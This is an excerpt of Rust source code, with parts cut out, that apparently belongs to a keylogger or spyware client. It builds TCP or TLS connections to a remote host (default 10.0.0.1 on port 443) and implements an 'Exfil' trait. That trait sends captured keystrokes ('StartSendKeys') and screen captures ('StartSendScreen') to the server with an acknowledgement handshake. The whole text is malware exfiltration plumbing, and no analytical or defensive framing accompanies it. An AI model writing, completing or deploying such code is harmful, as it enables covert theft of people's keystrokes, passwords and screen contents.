...
const REMOTE_DOMAIN: &str = "10.0.0.1";
const REMOTE_PORT: i32 = 443; // defaults
...
impl Socket {
    pub fn pop_tls(self) -> TLSSocketClient {
        if let Socket::Tls(res) = self { res }
        else { panic!("Attempted to unwrap wrong type!") }
    }
    pub fn pop_tcp(self) -> TCPSocketClient {
        if let Socket::Tcp(res) = self { res }
        else { panic!("Attempted to unwrap wrong type!") }
    }
...
pub fn build_socket(args: &mut Vec<String>) -> Socket {
    let is_ssl: bool = {
        if args.len() >= 2 {
            if args[1].to_lowercase() == "-s" { args.remove(1); true }
            else { false }
        } else { false }
    };
    match is_ssl {
        true => match args.len() {
            2 => Socket::Tls(
                TLSSocketClient::init(Some(&args[1]), None)
            ),
            3 => Socket::Tls(
                TLSSocketClient::init(Some(&args[1]), Some(&args[2]))
            ),
            _ => Socket::Tls(TLSSocketClient::init(None, None)),
        },
        false => match args.len() {
            2 => Socket::Tcp(
                TCPSocketClient::init(Some(&args[1]), None)
            ),
            3 => Socket::Tcp(
                TCPSocketClient::init(Some(&args[1]), Some(&args[2]))
            ),
            _ => Socket::Tcp(TCPSocketClient::init(None, None)),
        }
    }
}
    ...
    fn send(&mut self, signal: TcpSignalClient, data: Option<Vec<u8>>) {
        match signal {
            TcpSignalClient::StartSendKeys => {
                self.send_on_ack(&signal, 5, data.unwrap_or(Vec::new())).unwrap();
            },
            TcpSignalClient::StartSendScreen => {
                self.send_on_ack(&signal, 6, data.unwrap_or(Vec::new())).unwrap();
            },
            _ => {}
        };
    }
...
impl TCPSocketClient {
    ...
    ) -> TCPSocketClient
    {
        ...
        match port {
            ...
            None => p = String::from("443")
        };
        let mut nossl_stream = match destination {
            Some(s) => TcpStream::connect(
                format!("{}:{}", s, p)
            ).unwrap(),
            None => TcpStream::connect(
...
impl Exfil for TCPSocketClient {
    ...
    ) -> Result<(), i32>
    {
        ...
        if i32::from_be_bytes(res) == ack {
            ...
            self.sock.read(&mut reply).unwrap();
            if i32::from_be_bytes(reply) != 1 { 
                ...
                self.sock.write(&4i32.to_be_bytes()).unwrap(); 
...
impl TLSSocketClient {
    ...
    ) -> TLSSocketClient
    {
        ...
        let mut ssl_stream = match destination {
            Some(s) => TcpStream::connect(
                format!("{}:{}", s, p)
            ).unwrap(),
            None => TcpStream::connect(
